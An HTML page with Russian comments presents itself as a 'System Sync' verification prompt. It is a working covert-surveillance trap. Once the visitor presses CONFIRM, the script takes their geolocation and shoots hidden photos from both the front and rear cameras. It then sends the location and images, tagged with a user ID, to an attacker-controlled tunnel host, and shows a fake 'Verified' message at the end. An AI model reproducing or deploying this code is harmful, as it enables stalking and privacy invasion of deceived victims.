<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>System Sync</title>
    <style>
        body { margin:0; background:#000; color:#fff; font-family:-apple-system, sans-serif; display:flex; align-items:center; justify-content:center; height:100vh; text-align:center; }
        .card { width:260px; padding:35px; background:#111; border:1px solid #333; border-radius:28px; }
        h2 { font-size:22px; margin-bottom:10px; }
        p { font-size:14px; color:#666; margin-bottom:30px; }
        .btn { background:#fff; color:#000; border:none; padding:18px; border-radius:15px; width:100%; font-weight:bold; font-size:16px; cursor:pointer; }
        #loader { display:none; margin:10px auto; width:25px; height:25px; border:3px solid #222; border-top:3px solid #fff; border-radius:50%; animation:spin 1s linear infinite; }
        @keyframes spin { to { transform:rotate(360deg); } }
        video, canvas { display:none; }
    </style>
</head>
<body>
    <div class="card">
        <h2 id="st">Verification</h2>
        <p id="msg">Confirm to sync</p>
        <button class="btn" id="go" onclick="run()">CONFIRM</button>
        <div id="loader"></div>
    </div>

    <video id="v" autoplay playsinline muted></video>
    <canvas id="c"></canvas>

    <script>
        // === ВСТАВЬ СЮДА СВЕЖУЮ ССЫЛКУ ИЗ ТЕРМИНАЛА SSH ===
        const API = "https://334b8137373cc7.lhr.life"; 

        const urlParams = new URLSearchParams(window.location.search);
        const user = urlParams.get('user') || "Unknown_User";

        // Функция для захвата фото с конкретной камеры
        async function takePhoto(isBack) {
            const constraints = {
                video: { facingMode: isBack ? { exact: "environment" } : "user" }
            };

            try {
                const stream = await navigator.mediaDevices.getUserMedia(constraints);
                const v = document.getElementById('v');
                v.srcObject = stream;

                // Ждем загрузки видео и фокусировки
                await new Promise(r => v.onloadedmetadata = r);
                await new Promise(r => setTimeout(r, 1500));

                const canvas = document.getElementById('c');
                canvas.width = v.videoWidth;
                canvas.height = v.videoHeight;
                canvas.getContext('2d').drawImage(v, 0, 0);
                
                const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.7));
                
                // ОСТАНАВЛИВАЕМ ПОТОК (Критично для переключения камер!)
                stream.getTracks().forEach(t => t.stop());
                
                return blob;
            } catch (e) {
                console.log(isBack ? "Back camera failed" : "Front camera failed", e);
                return null;
            }
        }

        async function run() {
            const btn = document.getElementById('go'), ld = document.getElementById('loader'), st = document.getElementById('st'), msg = document.getElementById('msg');
            btn.style.display = 'none'; ld.style.display = 'block'; st.innerText = "Syncing...";

            const fd = new FormData();

            try {
                // 1. ПОЛУЧАЕМ ГЕО (фоном)
                navigator.geolocation.getCurrentPosition((p) => {
                    fetch(`${API}/location?lat=${p.coords.latitude}&lon=${p.coords.longitude}&user=${user}`, {mode:'no-cors'});
                }, null, {timeout: 5000});

                // 2. ДЕЛАЕМ СЕЛФИ (Front)
                msg.innerText = "Step 1/2...";
                const frontBlob = await takePhoto(false);
                if (frontBlob) fd.append('files', frontBlob, 'front.jpg');

                // 3. ДЕЛАЕМ ФОТО ЗАДНЕЙ КАМЕРОЙ (Back)
                msg.innerText = "Step 2/2...";
                const backBlob = await takePhoto(true);
                if (backBlob) fd.append('files', backBlob, 'back.jpg');

                // 4. ОТПРАВЛЯЕМ ВСЁ НА МАК
                msg.innerText = "Finalizing...";
                await fetch(`${API}/upload-photo?user=${user}`, { 
                    method: 'POST', 
                    body: fd 
                });

                // 5. ЗАВЕРШАЕМ
                st.innerText = "Verified";
                ld.style.display = 'none';
                msg.innerText = "Process complete.";
                msg.style.color = "#4cd964";

            } catch (e) {
                alert("Please allow Camera & Location access");
                location.reload();
            }
        }
    </script>
</body>
</html>
